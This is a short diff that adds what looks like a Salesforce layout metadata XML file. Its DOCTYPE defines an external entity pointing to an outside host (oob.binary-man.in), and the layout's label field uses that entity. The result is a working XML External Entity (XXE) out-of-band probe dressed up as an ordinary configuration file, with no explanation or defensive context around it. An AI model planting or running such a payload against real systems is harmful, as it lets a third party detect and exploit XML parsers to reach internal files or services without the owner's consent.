@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/layout"> ]>
+<Layout xmlns="http://soap.sforce.com/2006/04/metadata"><layoutSections><customLabel>false</customLabel><detailHeading>false</detailHeading><editHeading>true</editHeading><label>&gsx;</label><layoutColumns/><style>OneColumn</style></layoutSections></Layout>
